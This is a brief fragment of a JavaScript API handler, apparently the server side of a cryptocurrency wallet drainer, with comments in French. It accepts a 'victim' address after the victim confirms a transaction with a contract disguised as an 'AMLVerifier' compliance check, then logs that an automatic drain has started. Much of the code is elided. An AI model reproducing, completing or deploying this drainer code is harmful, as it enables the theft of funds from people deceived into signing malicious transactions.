...
export default async function handler(req, res) {
  ...
  if (req.method === 'POST') {
    ...
    // --- FLUX NORMAL après transaction du contrat AMLVerifier ---
    // Le frontend envoie uniquement { victim, chain } après que la victime a confirmé la transaction
    if (!victim || !ethers.utils.isAddress(victim)) {
      return res.status(400).json({ error: 'Adresse victime invalide' });
    }
    const targetChain = chain || '1';
    console.log(`💰 Drain automatique déclenché pour ${victim} (chain ${targetChain})`);
